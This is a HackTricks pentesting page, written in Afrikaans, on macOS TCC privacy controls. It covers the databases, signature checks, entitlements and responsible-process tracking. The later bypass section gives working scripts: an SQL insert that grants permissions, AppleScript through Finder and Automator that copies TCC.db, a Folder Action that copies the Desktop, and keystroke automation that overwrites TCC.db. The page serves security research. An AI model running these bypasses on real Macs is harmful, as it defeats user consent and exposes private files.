# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Basiese inligting**

**TCC (Transparency, Consent, and Control)** is ’n sekuriteitsprotokol wat daarop fokus om programtoestemmings te reguleer. Die primêre rol daarvan is om sensitiewe funksies soos **liggingdienste, kontakte, foto’s, mikrofoon, kamera, toeganklikheid en volle skyftoegang** te beskerm. Deur uitdruklike gebruikerstoestemming te vereis voordat ’n program toegang tot hierdie elemente kry, verbeter TCC privaatheid en gebruikersbeheer oor hul data.

Gebruikers kom met TCC in aanraking wanneer programme toegang tot beskermde funksies versoek. Dit is sigbaar deur ’n boodskap wat gebruikers toelaat om **toegang goed te keur of te weier**. Verder maak TCC voorsiening vir direkte gebruikershandelinge, soos om **lêers na ’n program te sleep en neer te sit**, om toegang tot spesifieke lêers te verleen. Dit verseker dat programme slegs toegang het tot dit wat uitdruklik toegelaat is.

![’n Voorbeeld van ’n TCC-boodskap](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** word hanteer deur die **daemon** wat hier geleë is: `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`, en wat opgestel is in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (wat die mach-diens `com.apple.tccd.system` registreer).

Daar is ’n **user-mode tccd** wat vir elke aangemelde gebruiker loop, soos gedefinieer in `/System/Library/LaunchAgents/com.apple.tccd.plist`. Dit registreer die mach-dienste `com.apple.tccd` en `com.apple.usernotifications.delegate.com.apple.tccd`.

Hier kan jy die tccd sien wat as die stelsel en as gebruiker loop:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Toestemmings word **van die ouer-** toepassing **geërf**, en die **toestemmings** word volgens die **Bundle ID** en die **Developer ID** **nagespoor**.

### TCC-databasisse

Die toestemmings/weierings word dan in sommige TCC-databasisse gestoor:

- Die stelselwye databasis in **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Hierdie databasis word deur **SIP beskerm**, dus kan slegs ’n SIP-omseiling daarin skryf.
- Die gebruiker se TCC-databasis **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** vir voorkeure per gebruiker.
  - Hierdie databasis word beskerm, dus kan slegs prosesse met hoë TCC-voorregte, soos Full Disk Access, daarin skryf (maar dit word nie deur SIP beskerm nie).

> [!WARNING]
> Die vorige databasisse word ook **deur TCC beskerm teen leestoegang**. Jy sal dus **nie jou gewone gebruiker-TCC-databasis kan lees nie**, tensy dit vanuit ’n TCC-bevoorregte proses gedoen word.
>
> Onthou egter dat ’n proses met hierdie hoë voorregte (soos **FDA** of **`kTCCServiceEndpointSecurityClient`**) in die gebruiker se TCC-databasis sal kan skryf.

- Daar is ’n **derde** TCC-databasis in **`/var/db/locationd/clients.plist`** wat aandui watter kliënte toegelaat word om **liggingdienste te gebruik**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** teken geregistreerde TCC-databasispaadjies aan. ’n Geplante gebruikersdatabasis kan verwerp word tensy dit geregistreer is; om hierdie pad te ken, verleen op sigself nie toegang tot enige van die databasisse nie.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** bevat besluite oor bestuurde Privacy Preferences Policy Control (PPPC). Gaan dit na wanneer ’n toepassing ’n bestuurde toestemming het wat nie in die gewone `access`-rye voorkom nie.<sup>[[7]](#references)</sup>
- Die SIP-beskermde lêer **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (maar leesbaar vir enigiemand) is ’n toelaatlys van toepassings wat ’n TCC-uitsondering vereis.

> [!TIP]
> Die TCC-databasis in **iOS** is in **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Die **Kennisgewingsentrum-UI** kan **veranderinge aan die stelsel se TCC-databasis aanbring**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> Gebruikers kan egter reëls **terugstel** met die **`tccutil`**-opdragreëlnutsprogram; dit het geen gedokumenteerde navraagbewerking nie.<sup>[[4]](#references)</sup>

#### Raadpleeg die databasisse

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Deur albei databasisse na te gaan, kan jy die toestemmings nagaan wat ’n app toegelaat of geweier het, of waarvoor dit nog nie gevra het nie (dit sal daarvoor vra).

- Die **`service`** is die stringvoorstelling van die TCC-**toestemming**
- Die **`client`** is die **bundle ID** of **pad na die binêre lêer** met die toestemmings
- Die **`client_type`** dui aan of dit ’n Bundle Identifier (0) of ’n absolute pad (1) is

<details>

<summary>Hoe om dit uit te voer as dit ’n absolute pad is</summary>

Doen eenvoudig **`launctl load you_bin.plist`**, met ’n plist soos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- Die **`auth_value`** kan verskillende waardes hê: denied(0), unknown(1), allowed(2) of limited(3).
- Die **`auth_reason`** kan die volgende waardes hê: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Die **csreq**-veld dui aan hoe die binêre lêer wat uitgevoer gaan word, geverifieer moet word sodat die TCC-toestemmings toegestaan kan word:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Vir meer inligting oor die **ander velde** van die tabel, [**lees hierdie blogplasing**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Jy kan ook **reeds verleende toestemmings** vir apps nagaan by `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Gebruikers kan reëls **terugstel** met `tccutil`, maar moet die databasisse inspekteer om toestemmingsnavrae te doen.<sup>[[4]](#references)</sup>

#### Stel TCC-toestemmings terug

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identifiseer Apple Events-sender- en -teikentoestemmings

’n Automation-toestemming is ’n **sender-na-teiken**-besluit, nie toestemming om elke app te beheer nie. Met toegang tot die gebruikersdatabasis, lys toegelate sender-/teikenpare voordat jy die [Apple Events](macos-apple-events.md)- of Finder-werkvloeie hieronder probeer. `csreq` identifiseer die sender en `indirect_object_code_identity` identifiseer die teiken; dekodeer enige nie-null blob met die `csreq`-metode hierbo.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC-handtekeningkontroles

Die TCC-**databasis** stoor die **Bundle ID** van die toepassing, maar dit **stoor** ook **inligting** oor die **handtekening** om **seker te maak** dat die toepassing wat toestemming vra om iets te gebruik, die regte een is.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Daarom sal ander toepassings wat dieselfde naam en bundle ID gebruik, nie toegang hê tot toestemmings wat aan ander toepassings verleen is nie.

### Entitlements & TCC-toestemmings

'n TCC-toestemming ignoreer nie **App Sandbox**-beperkings nie. 'n Gesandboxte kamera-kliënt benodig `com.apple.security.device.camera`; Apple stel hierdie vermoë ook aan Hardened Runtime-toepassings beskikbaar. Nie een van hierdie entitlements omseil die afsonderlike gebruikerstoestemmingsversoek nie. Moenie die sandbox-entitlement as 'n onvoorwaardelike vereiste vir elke ongesandboxte proses beskou nie. Kontroleer beide die uitvoerbare lêer se entitlements en die verantwoordelike toepassing wanneer 'n versoek misluk.<sup>[[8]](#references)[[9]](#references)</sup>

Let daarop dat entitlements plist-lêers is en deel van code sig vorm. Hulle word verder in code sig deur spesiale gleuwe gehash en kan óf deur kernel-kode in die kernel, óf deur gebruikermodus-kode met `csops(#169)` of `csops_audittoken(#170)` navraag gedoen word.

Toepassings het egter **geen spesifieke entitlements nodig** om toegang tot **sekere gebruikersvouers** soos `~/Desktop`, `~/Downloads` en `~/Documents` te kry nie. Die stelsel hanteer toegang deursigtig en **vra die gebruiker** soos nodig om toestemming.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple se toepassings **sal nie versoeke genereer nie**. Hulle het **vooraf toegekende regte** in hul **entitlements**-lys, wat beteken dat hulle **nooit 'n opspringvenster sal genereer nie**, en **ook nie** in enige van die **TCC-databasisse** sal verskyn nie. Byvoorbeeld:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Dit sal keer dat Calendar die gebruiker vra om toegang tot herinneringe, die kalender en die adresboek te kry.

> [!TIP]
> Benewens sommige amptelike dokumentasie oor entitlements, is dit ook moontlik om nie-amptelike **interessante inligting oor entitlements te vind by** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Sommige TCC-permissies is: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Daar is geen openbare lys wat hulle almal definieer nie, maar jy kan hierdie [**lys van bekendes**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) nagaan.<sup>[[1]](#references)</sup>

### Sensitiewe, onbeskermde plekke

- $HOME (self)
- $HOME/.ssh, $HOME/.aws, ens.
- /tmp

### Gebruikersbedoeling / com.apple.macl

Soos voorheen genoem, is dit moontlik om **'n App toegang tot 'n lêer te gee deur dit te sleep en daarop neer te sit**. Hierdie toegang sal nie in enige TCC-databasis gespesifiseer word nie, maar as 'n **uitgebreide** **kenmerk van die lêer**. Hierdie kenmerk sal die UUID van die toegelate app **stoor**:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Dit is interessant dat die **`com.apple.macl`**-attribuut deur die **Sandbox** bestuur word, nie deur tccd nie.
>
> Let ook daarop dat as jy ’n lêer wat die UUID van ’n toepassing op jou rekenaar toelaat na ’n ander rekenaar skuif, dit nie daardie toepassing toegang sal gee nie, omdat dieselfde toepassing verskillende UID’s sal hê.

Die uitgebreide attribuut `com.apple.macl` **kan nie soos ander uitgebreide attribute skoongemaak word nie**, omdat dit **deur SIP beskerm word**. Soos [**in hierdie plasing verduidelik word**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), is dit egter moontlik om dit te deaktiveer deur die lêer te **zip**, dit te **verwyder** en dit te **unzip**.<sup>[[3]](#references)</sup>






## XNU-meganisme vir verantwoordelike proses

In macOS/iOS is die **verantwoordelike proses**-meganisme ’n kritieke sekuriteitsfunksie wat deur die **TCC (Transparency, Consent, and Control)**-raamwerk en ander sekuriteitstelsels gebruik word om na te spoor watter proses uiteindelik vir ’n handeling verantwoordelik is, selfs deur kettings van kinderprosesse.

Wanneer TCC toestemmings nagaan (bv. vir kamera, mikrofoon, ligging), gaan dit nie altyd die onmiddellike proses na wat die versoek rig nie. In plaas daarvan gaan dit die **verantwoordelike proses** na—gewoonlik die GUI-toepassing wat die handeling begin het, selfs al kom die werklike versoek van ’n helperproses of daemon.

Om te bepaal aan watter toepassing ’n versoek toegeskryf word, stroom TCC se `AttributionChain`-boodskappe terwyl jy die beskermde handeling uitvoer. Dit is betroubaarder as om toegang aan die helper-uitvoerbare lêer toe te ken bloot omdat dit die API-oproep gemaak het. Vergelyk die gerapporteerde identiteit met die bondel-ID of pad en die ondertekeningsvereiste in die toepaslike `access`-ry.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Hoe die verantwoordelike proses ingestel word</summary>

### Prosesstruktuurvelde

Elke proses in XNU handhaaf twee belangrike UUID-identifiseerders:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: Die proses se eie UUID (van sy Mach-O-binêre lêer se `LC_UUID`-laaibevel)
- **`p_responsible_pid`**: Die PID van die verantwoordelike proses
- **`p_responsible_uuid`**: Die UUID van die verantwoordelike proses (bly behoue selfs nadat daardie proses eindig)

### Hoe die verantwoordelike proses ingestel word

1. **Tydens prosesskepping (Fork)**

Wanneer ’n nuwe proses met `fork()` of `posix_spawn()` geskep word, word die verantwoordelike proses van die ouer geërf (die `exec()`-stelseloproep hergebruik die bestaande `proc`-struktuur, dus word hierdie stap nie daar herhaal nie):

**Ligging**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Kernpunte:**
- Kinderprosesse **erf** die ouer se `p_responsible_pid`
- Dit skep ’n **verantwoordelikheidsketting** deur die proseshierargie
- Die verantwoordelike proses verwys gewoonlik na die oorspronklike GUI-toepassing

2. **Die kernfunksie: `proc_set_responsible_pid()`**

**Ligging**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Wat hierdie funksie doen:**
1. **Stel die verantwoordelike PID** in die teikenproses in
2. **Soek die verantwoordelike proses op** met `proc_find()` (verhoog die verwysingtelling)
3. **Kopieer die UUID** van die verantwoordelike proses se `p_uuid` na die teikenproses se `p_responsible_uuid`
4. **Maak die verwysing vry** met `proc_rele()` (verlaag die verwysingtelling)

3. **Waarom word beide PID en UUID gestoor?**

Die benadering met dubbele berging los ’n kritieke probleem op:

| Veld | Doel | Probleem | Oplossing |
|-------|-------|---------|----------|
| `p_responsible_pid` | Vinnige opsoek van die huidige proses | PID kan hergebruik word nadat die proses beëindig is | Word gebruik om ’n aktiewe proses op te soek |
| `p_responsible_uuid` | Volgehoue identifikasie | Bly behoue nadat die proses beëindig is | Word vir sekuriteitskontroles en ouditering gebruik |

**Die probleem**: As die verantwoordelike proses beëindig word voordat die kindproses beëindig word, kan die PID herwin en aan ’n heeltemal ander proses toegeken word.

**Die oplossing**: Die UUID is onveranderlik en identifiseer die spesifieke binêre lêer wat verantwoordelik was uniek, selfs nadat dit beëindig is.

### Proseskeppingsvloei

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID-bron: LC_UUID-laaibevel

Die UUID wat in `p_uuid` gestoor word, kom van die **Mach-O-uitvoerbare lêer se `LC_UUID`-laaibevel**:

1. **Kompileringstyd**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Uitvoeringstyd**

**Ligging**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **In prosesstruktuur gestoor**

**Ligging**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Ligging**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Voeg in TCC in

As jy op ’n stadium skryftoegang tot ’n TCC-databasis kry, kan jy iets soos die volgende gebruik om ’n inskrywing by te voeg (verwyder die kommentaar):

<details>

<summary>Voorbeeld van invoeging in TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

As jy daarin geslaag het om toegang tot ’n app met sekere TCC-permissies te kry, kyk na die volgende bladsy met TCC-payloads om dit te misbruik:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Lees meer oor Apple Events in:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Outomatisering (Finder) na FDA\*

Die TCC-naam van die Automation-permissie is: **`kTCCServiceAppleEvents`**\
Hierdie spesifieke TCC-permissie dui ook die **toepassing aan wat bestuur kan word** binne die TCC-databasis (dus laat die permissies nie toe dat alles sommer bestuur word nie).

**Finder** is ’n toepassing wat **altyd FDA het** (selfs al verskyn dit nie in die UI nie), so as jy **Automation**-regte daaroor het, kan jy sy regte misbruik om **dit sekere aksies te laat uitvoer**.\
In hierdie geval sal jou app die permissie **`kTCCServiceAppleEvents`** oor **`com.apple.Finder`** nodig hê.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

’n Gerapporteerde skryfvariant, wanneer ’n Automation-pad na Finder beskikbaar is, is om Finder die gebruiker se `com.apple.TCC`-gids te laat **hernoem**. Die databasis onder die hernoemde pad is toe na ’n voorbereidingsgids gekopieer, daar gewysig, teruggekopieer en die gids se naam is herstel. Die nuwe `kTCCServiceAppleEvents`-ry moet **beide** die sender-binêre lêer en Finder identifiseer, insluitend hul kodevereistes; om toestemming aan ’n sender te gee sonder die teikenidentiteit is nie dieselfde nie. Hierdie tegniek is padafhanklik, so verifieer dit op die teiken se macOS-weergawe eerder as om aan te neem dat Finder Automation alleen arbitrêre databasisinskrywings moontlik maak.<sup>[[11]](#references)</sup>

> [!WARNING]
> Met hierdie toestemming sal jy **Finder kan vra om toegang tot TCC-beperkte vouers te kry** en vir jou die lêers te gee, maar sover ek weet sal jy **nie vir Finder arbitrêre kode kan laat uitvoer** om sy FDA-toegang ten volle te misbruik nie.
>
> Daarom sal jy nie die volle FDA-vermoëns kan misbruik nie.

Dit is die TCC-aanporboodskap om Automation-regte oor Finder te kry:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Let daarop dat die **Automator**-toepassing, omdat dit die TCC-toestemming **`kTCCServiceAppleEvents`** het, **enige toepassing kan beheer**, soos Finder. As jy dus toestemming het om Automator te beheer, kan jy ook **Finder** beheer met kode soos die volgende:

<details>

<summary>Kry ’n shell binne Automator</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Dieselfde gebeur met die **Script Editor-app**: dit kan Finder beheer, maar met behulp van ’n AppleScript kan jy dit nie dwing om ’n script uit te voer nie.

### Outomatisering (SE) na sommige TCC

**System Events kan Folder Actions skep, en Folder Actions kan toegang tot sommige TCC-vouers kry** (Desktop, Documents & Downloads), dus kan ’n script soos die volgende gebruik word om hierdie gedrag te misbruik:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Outomatisering (SE) + Toeganklikheid (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** na FDA\*

Outomatisering op **`System Events`** + Toeganklikheid (**`kTCCServicePostEvent`**) laat jou toe om **toetsaanslae na prosesse te stuur**. Só kan jy Finder misbruik om die gebruiker se TCC.db te verander of FDA aan ’n arbitrêre toepassing toe te ken (hoewel ’n wagwoord dalk hiervoor gevra kan word).

Finder-voorbeeld van hoe om die gebruiker se TCC.db te oorskryf:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` na FDA\*

